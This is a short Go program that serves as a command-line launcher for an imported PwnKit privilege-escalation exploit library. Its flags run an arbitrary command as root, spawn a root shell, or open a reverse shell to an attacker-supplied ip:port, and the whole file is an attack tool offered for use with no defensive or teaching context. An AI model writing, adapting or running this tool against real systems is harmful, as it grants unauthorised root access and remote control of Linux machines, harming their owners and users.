package main

import (
	"flag"
	"fmt"
	"github.com/OXDBXKXO/go-PwnKit"
)

func main() {
	cmd := flag.String("c", "", "Run command as root in separate process")
	shell := flag.Bool("s", false, "Spawn a root shell")
	reverseShell := flag.String("r", "", "Open a reverse-shell in separate process. Format: ip:port")
	output := flag.Bool("o", false, "Pipe output of fork command to terminal")
	flag.Parse()

	var err error
	if *reverseShell != "" {
		gopwnkit.RevShell(*output, *reverseShell)
	} else if *cmd != "" {
		gopwnkit.Command(*output, *cmd)
	} else if *shell {
		gopwnkit.Shell()
	} else {
		flag.Usage()
	}

	if err != nil {
		fmt.Println(err)
	}
}
